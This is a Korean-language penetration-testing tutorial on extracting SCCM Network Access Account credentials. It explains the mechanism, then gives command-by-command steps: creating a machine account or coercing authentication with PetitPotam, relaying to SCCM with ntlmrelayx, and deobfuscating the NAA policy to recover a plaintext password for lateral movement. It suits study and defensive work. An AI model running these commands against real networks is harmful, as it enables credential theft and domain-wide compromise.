# SCCM

## 개념

SCCM(Microsoft System Center Configuration Manager)은 네트워크 내 윈도우 호스트들을 업데이트하거나 패치 하는데 사용되는 Intune 솔루션 제품들 중 하나다.

* **SCCM Server:** SCCM을 전반적으로 관리하는 서버
* **SCCM Client:** SCCM에 등록된 뒤 업데이트 및 패치를 받을 클라이언트 호스트
* **DP (Distribution Point):** SCCM 클라이언트들이 다운받고 설치할 패키지들을 배포하는 서버
* **NAA (Network Access Account):** SCCM 클라이언트가 머신 계정으로 DP나 SCCM 서버에 접근할 수 없는 경우, 대신 사용하게 되는 SCCM 전용 네트워크 접근 계쩡

SCCM에는 NAA라는 계정이 존재한다. 클라이언트들은 SCCM 서버 혹은 DP 서버에 접근할 때 원래 자신의 머신 계정을 이용하는데, 이때 접근이 불가능할 경우 NAA를 사용하게 된다. NAA와 관련된 계정 정보 (유저이름, 비밀번호) SCCM 클라이언트가 SCCM 서버에 등록될 때 자동적으로 클라이언트에게 전송된다. 클라이언트가 서버에 등록할 때 다양한 정책과 설정 관련된 파일들을 XML 형태로 다운받게 되는데, 이때 NAA 계정 정보가 들어간 `NAAConfig.xml` 도 같이 다운받게 된다.

`NAAPolicy.xml` 에는 NAA 계정 정보가 암호화 + 난독화 되어 있는 상태로 저장된다. 먼저 난독화가 진행된 뒤, 이 난독화된 blob에 암호화를 진행한다. 암호화에는 SCCM 클라이언트가 등록할 때 생성한 Self-Signed Certificate 의 RSA 공개 키에서 도출된 키가 사용된다.

## 공격

#### 공격 사전 조건

1. SCCM 서버가 네트워크안에 있으며, SCCM을 사용 중
2. SCCM 서버가 NAA 를 사용하도록 설정
3. 공격자가 머신 계정을 생성할 수 있도록 MachineAccountQuota 가 0 이상이거나, Authentication Coercion 공격 가능

위 조건들이 맞는 다면 공격자는 만들어놨던 머신 계정을 이용하거나 Authentication Coercion을 이용해 SCCM 서버에 머신 계정으로 접근한 뒤, 가짜 디바이스를 생성하고 SCCM 서버에 등록한 다음, 서버가 배포하는 `NAAConfig.xml` 에서 `NAAPolicy.xml` 을 받아온다. 그 뒤, 자신의 Self-Signed Certificate RSA 공개키에서 도출한 키를 사용해 NAA 계정 정보를 복호화 한 뒤, 윈도우의 기본 DLL 파일인 `PolicyAgent.dll` 을 이용해 NAA 계정 정보를 역난독화 한 뒤 NAA 의 평문 유저 이름과 비밀번호를 알아낼 수 있다.

NAA 계정의 경우 네트워크 내 호스트들에 접근한 뒤 패키지들을 설치하거나 패치를 진행하는 등의 일을 해야하기 때문에 로컬 관리자 권한을 갖고 있는 경우가 많다. 즉, NAA 계정 정보만 성공적으로 얻어낼 수 있다면 공격자는 순식간에 네트워크 내의 모든 윈도우 호스트들을 장악할 수 있게 된다.

## 실습

### 정보 수집

SCCM 서버 정보 수집

```
# DNS 
sccm.domain.com, sccmcm.domain.com, sccmdp.domain.com 등으로 검색 

# HTTP/HTTPS 
1. 모든 웹 서버 아이피주소 확인 (nmap -> grep + cut + sort) 
2. curl, gowitness 등을 사용해 http(s)://<host>/ccm_system_windowsauth/request 페이지가 존재하는지, 존재 한다면 basic auth 를 나타내는지 확인 
```

MAQ 및 Auth Coercion 확인

```
cme ldap <dc> -u <u> -p <p> -M maq 
cme smb <host> -u <u> -p <p> -M petitpotam,spooler,dfscoerce,shadowcoerce 
```

### 공격 1 - Machine Account + SCCMWtf

머신 계정을 생성한 뒤 SCCM 서버에 접근, 가짜 디바이스 생성, NAAConfig + NAAPolicy를 받아온다

```
# 머신 계정 생성 
addcomputer.py domain.com/user:pass -dc-ip <dc> -computer-name 'fakeComp' -computer-pass '<pass>'

# SCCMWtf
git clone https://github.com/xpn/sccmwtf
python3 sccmwtf.py fake-device fake-device.domain.com SCCM 'domain.com\fakeComp$' '<pass>'

# NAAPolicy.xml 받은 뒤 Post-Ex 단계로 진행 
```

### 공격 2 - Authentication Coercion + SCCM Relay

```
# Authentication Coercion. 예) Petitpotam 
python3 petitpotam.py -u <u> -p <p> <attackerIP> <targetIP>

# SCCM 서버를 향해 SCCM Relay 
- ThePorgs 포크 버전 사용 (https://github.com/ThePorgs/impacket) 

ntlmrelayx.py -t http://<server>/ccm_system_windowsauth/request --sccm --sccm-device fake-device --sccm-fqdn domain.com --http-port 80 --sccm-server sccm --sccm-sleep 10 -smb2support 

# NAAPolicy.xml 받은 뒤 Post-Ex 단계로 진행 
```

### Post-Ex - NAAPolicy.xml 역난독화

XPN이 발표한 `policysecretunobfuscate.c` 를 컴파일 한 뒤, `NAAPolicy.xml` 파일안의 `NetworkAccessUsername` 와 `NetworkAccessPassword` 의 CDATA 값을 줘서 실행하면 평문 비밀번호가 나온다.

```
PS C:\dev\naadeobs\x64\Debug> .\naadeobs.exe 112233<REDACTED>
choi\sccm-naa


PS C:\dev\naadeobs \x64\Debug> .\naadeobs.exe 112233<REDACTED>
Password123!
```

이제 얻어낸 평문 유저 이름과 평문 비밀번호로 네트워크 내 다양한 머신들을 장악하면 된다.

### 레퍼런스

* https://blog.xpnsec.com/unobfuscating-network-access-accounts/
* https://github.com/xpn/sccmwtf
* https://github.com/ThePorgs/impacket/pull/14
* https://www.thehacker.recipes/ad/movement/sccm-mecm
* https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
